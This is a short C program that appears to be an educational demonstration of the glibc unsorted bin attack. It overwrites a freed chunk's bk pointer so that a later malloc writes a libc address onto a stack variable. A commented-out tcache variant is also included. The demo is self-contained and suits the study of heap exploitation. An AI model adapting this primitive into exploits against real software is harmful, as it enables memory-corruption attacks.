#include <stdio.h>
#include <stdlib.h>

int main() {
	unsigned long stack_var = 0;
	fprintf(stderr, "the target we want to rewrite on stack: %p -> %ld\n", &stack_var, stack_var);

	unsigned long *victim = malloc(0x80);
	fprintf(stderr, "malloc the victim chunk: %p\n\n", victim);

	malloc(0x10);

	/*					//tcache
	free(victim);
	fprintf(stderr, "free the victim chunk to put it in a tcache bin\n");

	victim[0] = (unsigned long)(&stack_var);
	fprintf(stderr, "overwrite the next ptr with the target address\n");
	malloc(0x80);
	malloc(0x80);
	fprintf(stderr, "now we malloc twice to make tcache struct's counts '0xff'\n\n");
	*/

	free(victim);
	fprintf(stderr, "free the victim chunk to put it in the unsorted bin, bk: %p\n", (void*)victim[1]);

	victim[1] = (unsigned long)(&stack_var - 2);
	fprintf(stderr, "now overwrite the victim->bk pointer: %p\n\n", (void*)victim[1]);

	malloc(0x80);
	fprintf(stderr, "malloc(0x80): %p -> %p\n", &stack_var, (void*)stack_var);
}
